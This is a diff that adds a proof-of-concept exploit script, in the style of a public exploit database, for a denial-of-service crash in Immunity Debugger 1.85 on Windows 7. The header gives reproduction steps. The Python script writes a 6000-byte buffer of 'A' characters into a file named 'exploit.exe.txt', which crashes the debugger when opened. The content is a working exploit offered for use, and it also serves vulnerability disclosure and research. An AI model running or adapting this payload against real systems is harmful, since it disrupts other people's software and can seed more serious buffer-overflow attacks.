@@ -1,0 +1,25 @@
+# Exploit Title: Immunity Debugger 1.85 - Denial of Service (PoC)
+# Author: Gionathan "John" Reale
+# Date: 2018-08-28
+# Homepage: https://www.immunityinc.com/
+# Software Link: https://www.immunityinc.com/products/debugger/index.html
+# Tested Version: v1.85
+# Tested on OS: Windows 7 32-bit
+# Steps to Reproduce: Run the python exploit script, it will create a new 
+# file with the name "exploit.exe.txt".Start the program. In the new window click "File" >"Open". 
+# Now change the "Files of type" to # "Any file" and select "exploit.exe.txt" . 
+# Click "Open" and you will see a crash.
+
+#!/usr/bin/python
+   
+buffer = "A" * 6000
+
+payload = buffer
+try:
+    f=open("exploit.exe.txt","w")
+    print "[+] Creating %s bytes evil payload.." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created"
